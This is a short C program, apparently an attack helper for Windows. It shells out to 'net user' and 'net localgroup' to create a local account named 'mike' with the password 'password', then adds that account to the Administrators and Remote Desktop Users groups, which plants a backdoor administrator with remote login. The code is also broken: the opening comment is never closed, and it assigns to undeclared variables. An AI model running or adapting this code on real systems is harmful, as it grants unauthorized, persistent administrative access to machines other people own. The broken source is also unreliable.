/* Compile for windows, use to script adding a user on windows machines /*

#include <stdlib.h>
int main()
{
	int i;
		f=system("net user mike password /add");
	int b;
		u=system("net localgroup administrators mike /add");
	int c;
		c=system("net localgroup ""Remote Desktop Users"" mike /add");
	return 0;
}
